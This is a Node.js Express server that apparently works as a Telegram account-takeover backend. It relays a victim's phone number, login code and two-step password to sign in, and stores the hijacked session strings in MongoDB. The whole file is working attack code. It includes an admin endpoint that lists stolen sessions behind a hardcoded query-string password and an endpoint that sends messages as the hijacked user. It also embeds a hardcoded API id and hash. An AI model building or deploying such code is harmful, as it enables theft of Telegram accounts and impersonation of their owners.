const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';

mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    date: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const activeSessions = new Map();

// --- AUTH ENDPOINTS ---
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const session = activeSessions.get(phone);
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            await session.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
            const sessionString = session.client.session.save();
            await Session.create({ phone, session: sessionString });
            res.json({ success: true });
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                const pwd = await session.client.invoke(new Api.account.GetPassword());
                await session.client.invoke(new Api.auth.CheckPassword({ password: await session.client.srpSolve(pwd, password) }));
                const sessionString = session.client.session.save();
                await Session.create({ phone, session: sessionString });
                res.json({ success: true });
            } else { throw err; }
        }
    } catch (e) { res.status(400).json({ error: e.message }); }
});

// --- ADMIN ENDPOINTS ---
app.get('/get-sessions', async (req, res) => {
    if (req.query.pass !== 'Hinva312-') return res.status(401).json({ error: 'Unauthorized' });
    try {
        const sessions = await Session.find(); // Korrektur: Hier stand SessionModel
        res.json(sessions);
    } catch (err) { res.status(500).json({ error: 'DB Fehler' }); }
});

// Aktion: Nachricht senden
app.post('/send-message', async (req, res) => {
    const { phone, target, message } = req.body;
    const sessionDoc = await Session.findOne({ phone });
    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });

    try {
        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
        await client.connect();
        await client.sendMessage(target, { message });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server läuft auf ${PORT}`));
